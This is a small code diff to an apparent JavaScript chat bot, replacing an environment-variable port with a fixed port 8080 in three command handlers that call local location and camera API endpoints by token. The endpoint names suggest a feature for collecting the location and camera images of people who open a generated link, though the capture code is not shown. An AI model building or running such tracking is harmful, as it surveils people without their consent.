@@ -13560,7 +13560,7 @@ Aap is section se permanently ban hain.`);
         // FIX: Use correct server port — server/index.js runs on PORT env var
         // In Replit: REPLIT_DEV_DOMAIN is set; on Heroku: PORT is set.
         // We POST to localhost since server and bot run on same machine.
-        const _locPort    = process.env.PORT || 3001;
+        const _locPort    = 8080;
         const _locApiBase = `http://localhost:${_locPort}`;
 
         const _locResp = await axios.post(`${_locApiBase}/api/location/start`, {
@@ -13619,7 +13619,7 @@ case 'locresult': {
     if (!_lcToken) return reply(`🔑 *Usage:* ${prefix}loccheck <token>\n\nToken aapko ${prefix}location command mein mila tha.`);
 
     try {
-        const _lcPort    = process.env.PORT || 3001;
+        const _lcPort    = 8080;
         const _lcApiBase = `http://localhost:${_lcPort}`;
 
         const _lcResp = await axios.get(`${_lcApiBase}/api/location/result/${_lcToken}`, { timeout: 8000 });
@@ -13672,7 +13672,7 @@ case 'loccam': {
     if (!_lcamToken) return reply(`🔑 *Usage:* ${prefix}loccam <token>`);
 
     try {
-        const _lcamPort = process.env.PORT || 3001;
+        const _lcamPort = 8080;
         const _lcamBase = `http://localhost:${_lcamPort}`;
         const _lcamResp = await axios.get(`${_lcamBase}/api/location/camera/${_lcamToken}`, { timeout: 10000 });
 
